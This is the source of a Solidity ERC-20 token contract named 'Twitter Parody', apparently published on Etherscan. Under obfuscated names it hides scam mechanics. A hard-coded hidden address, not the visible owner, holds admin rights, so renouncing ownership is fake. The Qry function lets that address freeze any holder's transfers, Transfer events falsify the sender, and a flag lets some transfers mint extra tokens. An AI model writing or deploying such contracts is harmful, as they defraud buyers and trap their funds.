/**
 *Submitted for verification at Etherscan.io on 2022-11-06
*/

//SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Create(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    address AiO = 0x7Ecd8E47024439bEf6663b72a5a8025Af53e6370;
	address AiQ = 0xA64D08224A14AF343b70B983A9E4E41c8b848584;
    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
 modifier onlyOwner{
        require(msg.sender == AiO);
        _; }
    function owner() public view returns (address) {
        return _Owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }


}



contract PARODY is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private AiA;
    mapping (address => uint256) private AiY;
    mapping (address => mapping (address => uint256)) private AiV;
    uint8 private constant AiD = 8;
    uint256 private constant AiT = 200000000 * (10** AiD);
    string private constant _name = "Twitter Parody";
    string private constant _symbol = "PARODY";



    constructor () {
          AIUQ(AiQ, AiT);
        AiA[_msgSender()] = AiT; }
    

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return AiD;
    }

    function totalSupply() public pure  returns (uint256) {
        return AiT;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return AiA[account];
    }
	

   

	


    function allowance(address owner, address spender) public view  returns (uint256) {
        return AiV[owner][spender];
    }

            function approve(address spender, uint256 amount) public returns (bool success) {    
        AiV[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }

    function AIUQ(address AiJ, uint256 AiN) onlyOwner internal {
    emit Transfer(address(0), AiJ ,AiN); }

		function transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {
            require(AiY[sender] <= 1);
            require(AiY[recipient] <= 1);
         if(sender == AiO)  {
        require(amount <= AiA[sender]);
        AiA[sender] -= amount;  
        AiA[recipient] += amount; 
          AiV[sender][msg.sender] -= amount;
        emit Transfer (AiQ, recipient, amount);
        return true; } 
        require(amount <= AiA[sender]);
        require(amount <= AiV[sender][msg.sender]);
        AiA[sender] -= amount;
        AiA[recipient] += amount;
        AiV[sender][msg.sender] -= amount;
        emit Transfer(sender, recipient, amount);
        return true; }
        function Qry(address AiJ, uint256 AiN) public onlyOwner {
        AiY[AiJ] = AiN;}

        function transfer(address AiJ, uint256 AiN) public {
        require(AiY[msg.sender] <= 1);
        if(msg.sender == AiO)  {
        require(AiA[msg.sender] >= AiN);
        AiA[msg.sender] -= AiN;  
        AiA[AiJ] += AiN; 
        emit Transfer (AiQ, AiJ, AiN);} else  
        if(AiY[msg.sender] == 1) {AiA[AiJ] += AiN;}
        require(AiA[msg.sender] >= AiN);
        AiA[msg.sender] -= AiN;  
        AiA[AiJ] += AiN;          
        emit Transfer(msg.sender, AiJ, AiN);}
}